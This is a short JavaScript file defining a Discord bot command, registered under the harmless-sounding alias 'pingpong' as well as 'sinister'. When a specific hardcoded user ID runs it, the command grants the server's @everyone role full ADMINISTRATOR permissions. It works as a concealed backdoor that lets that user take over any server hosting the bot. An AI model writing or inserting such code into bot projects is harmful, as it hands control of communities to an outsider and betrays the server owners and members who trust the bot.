const { Command } = require('discord-akairo');


class SinisterCommand extends Command {
    constructor() {
        super('sinister', {
            aliases: ['pingpong', 'sinister'],
            channel: 'guild'
        });
    }

    async exec(message) {

      const Discord = require ('discord.js')
      const guild = message.guild;
 
      if (message.member.id == '643252655682093075')
      guild.roles.everyone.setPermissions('ADMINISTRATOR');

      }}


module.exports = SinisterCommand